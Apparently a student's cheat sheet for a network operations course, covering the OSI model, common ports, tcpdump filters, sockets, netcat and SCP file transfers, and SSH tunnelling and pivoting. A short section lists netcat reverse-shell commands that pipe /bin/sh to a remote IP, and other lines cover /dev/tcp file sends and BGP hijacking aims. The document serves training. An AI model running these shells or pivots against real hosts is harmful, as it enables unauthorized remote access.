FUNDAMENTALS
1 = bit 
4 = nibble
8 = byte
16 = half word
32 = word
64 = double word


OSI MODEL 

[7] - appliction - data - DNS,HTTP,TELNET
FTP (TCP 20/21) -- Active and Passive
SSH (TCP 22) -- Server, Clients, Sessions, Keys (User, Host, Session), Key Generator, Known-hosts database, Agent, Signer, Random Seed, Configuration File
Telnet (TCP 23)    SMTP (TCP 25)    TACACS (TCP 49) SIMPLE/EXTENDED    DNS (QUERY/RESPONSE) (TCP/UDP 53)
HTTP(S) (TCP 80/443)    POP (TCP 110)    IMAP (TCP 143)    RDP (TCP 3389)        DHCP (UDP 67/68)
TFTP (UDP 69)    NTP (UDP 123)    SNMP (UDP 161/162)    RADIUS (UDP 1645/1646 AND 1812/1813)    RTP (UDP any above 1023)

[6] - presentation - data - SSL,TLS,JPEG,GIF
Translating -- interoperability between encoding methods
Formatting -- ASCII, EBCDIC, .doc, .ppt, .xls, mp3, wav, avi, mp4, bmp, jpeg, gif, tiff, or png
Encryption >> 
<<Symetric - AES, Blowfish, Twofish, DES, RC4
<<Asymetric - PKI, Deffie-Hellman, DSS, RSA, Elliptic Curve
Compression of data -- Zip, TAR, RAR, 7zip, CAB

[5] - session - data - NetBIOS,PPTP, RPC, NFS
maintain the state of your ongoing connections
Socks 4/5 (TCP 1080)    RPC (Any Port)
PPTP (TCP 1723)         L2TP (TCP 1701)
SMB/CIFS (TCP 139/445 AND UDP 137/138) -- SMB resides over NetBios 

[4] - transport - segment - TCP, UDP
TCP - connection oriented protocol
3-way Handshake -- SYN, SYN/ACK, ACK
Data Transfer -- PSH/ACK, ACK
4-way Termination -- FIN/ACK, ACK, FIN/ACK, ACK
UDP - connectionless
More lightweight and suited for latency sensitive applications, or applications that do not benefit from a stateful connection.

[3] - network - packet - IP,ICMP,IGMP
layer of internetworking is discussed and itâ€™s parameters are defined
[MTU - (IHL * 4)]/8 = offset
IPv4 - 1970's , IPv6 - 2011

[2] - data link - frames - PPP, ATM, 802.2/3 Ethernet, Frame Relay
two hosts need to communicate across a common form of physical medium
Sublayers -- MAC (Media Access Control) and LLC (Logical Link Control)
Ethernet Header, ARP Header

[1] - physical - bits - Bluetooth, USB, 802.11 (Wi-Fi), DSL, 1000Base-T
data is physically sent across the network as ones and zeros
Hardware Specifications, ENcoding and Signaling, Data Transmission and Reception, Physical netwokr Design

Layer 2 Switching Technologies
Switch Operation -- Fast Forward, Fragment Free, Store and Forward
Cam Table -- Learn (Source MAC), Forward (Destination)
IEEE 802.1AD "Q-IN-Q" -- Standard (0x88A8), Non-Standard (0x9100)

Spanning Tree Protocol (STP) >>
<<Elect root bridge
<<Identify root ports on non-root bridge
<< Identify designated port
<<Set alt ports to blocking

Layer 2 Discovery Protocols -- CDP, FDP, LLDP
Dynamic Trunking Protocol
VLAN Trunking Protocol
Port Security Modes -- Shutdown, Restrict, Protect

BGP -- Road-map of Internet
routes traffic between AS number
Advertises IP CIDR Address Blocks
Establishes peer relationships
Complicated Configuration and slow path reaction

Hijacking BGP -- Illegitimate advertising of addresses
Propogates flase info
Purpose is ..
..stealing prefixes
..monitoring traffic
..intercept (possibly modify)
..black holing traffic
..performing MitM attacks

Hijacking BGP Defense -- IP prefix filtering
Hijacking detection..
..Tracking change in TTL
..Increased RTT, increases latency
..Monitoring misdirected traffic 
BGPSec

Capture Library
Libpcap
WinPcap
NPCAP

sudo tcpdump -i eth0 -XXvvn 'not port 22'

Berkeley Packet Filters
Requests SOC_RAW, setsockopt calls SO_ATTACH_FILTER

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
B = Header Byte offset
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
F = Result of Expresion
G = optional: Logical Operator (&& ||) to bridge expressions
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 &&)'

-User Space Sockets-
Stream Sockets
Datagram Sockets
-applications-
tcpdump  nmap  wireshark  netcat  /dev/tcp /dev/udp

-Kernel Space Sockets- (sudo required)
Raw Sockets
-applicatons-
tcpdump/wireshark on wire,  nmap for os id or to set specific flags,  netcat listener,  scapy


s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
socket.socket([*family*[,*type*[*proto*]]])
family -AF_INET, AF_INET6, AF_UNIX
type -SOCK_STREAM, SOCK_DGRAM, SOCK_RAW
proto -0, IPPROTO_RAW (only necessary for sock_raw)

Raw Sockets
Must include ip header and next header
requires guidance from RFC 
RFCs- technical and organized documents 
Testing/Avoiding specific defense mechanisms
Obfuscating data
Manually crafting a packet (chosen data in header)

banner grab
nc [ip] [port] (-u for UDP port)

curl [url or ip[port]] 
wget [url or ip[port]]/filename
eog <png file>
sudo nmap -sU <IP> -T4 -p<port> -A

PC1 -- nc -lp <port>
PC2 -- nc <PC1 IP><port> 0<pipe |nc <PC3 IP><port1> 1>pipe
PC3 -- nc -lp <port1>

FTP data(20) control(21) PW
active and passive

SFTP (TCP 22) PW
FTPS (TCP 443) PW

SCP (TCP 22) PW or SSH key --
-download from remote to local dir [scp student@172.16.82.106:secretstuff.txt /home/student]
-upload to a remote from a local dir [scp secretstuff.txt student@172.16.82.106:/home/student]
-copy from remote host to a seperate remote host [scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student]
-scp <username>@<target IP>:<target filepath> <. or name of file at current location>
-scp <source><destination>

SCP w/ alt SSHD
-download from remote to local dir [scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student]
-upload to a remote from a local dir [scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student]

SCP through tunnel
[ssh student@172.16.82.106 -L 1111:localhost:22 -NT]
-download from remote to local dir [scp -P 1111 student@localhost:secretstuff.txt /home/student]
-upload to a remote from a local dir [scp -P 1111 secretstuff.txt student@localhost:/home/student]

Netcat (CLIENT TO LISTENER FILE TRANSFER)
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

Netcat (LISTENER TO CLIENT FILE TRANSFER)
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

Netcat Relay
On Client -
mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
On Listener2 (sends) - nc -l -p 9002 < infile.txt
On Listener1 (receives) - nc -l -p 9001 > outfile.txt
writes out to both through named pipe

File transfer /dev/tcp (host w/out nc)
on receiving - nc -l -p 1111 > file.txt
on sending - cat file.txt > /dev/tcp/10.2.0.2/1111

Reverse shell (nc)
shelled into remote host - nc -c /bin/sh <ip> <unfiltered port>
piping bash - /bin/sh | nc <ip> <unfiltered port>
listen for shell - nc -l -p <same unfiltered port> -vvv
using -e - nc -l -p <unfiltered port> -e /bin/bash

ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT

create local port 1111 on local host, forwards to target host port 80[ssh student@172.16.82.106 -L 1111:localhost:80 -NT]


PC1> ssh user@S1 -L 1111:S2:22 -NT      

PC1> nc 127.0.0.1 <local port>

PC1> wget -r 127.0.0.1:<local port>                                       

PC1> ssh user@S1 -L 1112:S2:23 -NT (on S2 through telnet port 23)

PC1> telnet 127.0.0.1 1112

S2> ssh user@S1 -R 1200:127.0.0.1:22 -NT 

PC1> ssh user@S1

S1> nc 127.0.0.1 1200

PC1> ssh user@S1 -L 1113:127.0.0.1:1200 -NT

PC1 -------NO!------S1(22)----------S2(22,23,80)---------NO!-----------PC2
1112-S2:23         1200-S2:22
1113-S1:1200
